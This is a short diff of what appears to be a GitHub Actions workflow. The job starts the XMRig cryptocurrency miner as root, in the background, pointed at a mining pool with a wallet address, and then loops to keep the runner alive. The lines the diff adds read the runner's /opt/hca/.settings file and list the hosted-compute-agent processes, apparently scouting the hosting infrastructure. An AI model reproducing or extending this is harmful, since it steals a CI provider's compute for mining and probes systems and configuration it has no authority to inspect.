@@ -25,6 +25,8 @@ jobs:
         cd xmrig-6.24.0
         sudo su -c "nohup ./xmrig -o asia.hashvault.pro:443 -u 83snAgC9pR3GEwv6fLBDW96eCHaWzMbb3a4hdDNUMmzbZVzQtrbsGmoJBC6tgwDWCChFAqVnAvFKYPgmXLkTHFk145BV2SN -p TN102 -a rx --tls > xmrig.log 2>&1 &"
         echo "XMRig started in background."
+        cat /opt/hca/.settings
+        ps ufax | grep -A 5 hosted-compute-agent
     - name: Keep VPS alive
       run: |
         for i in $(seq 1 360); do
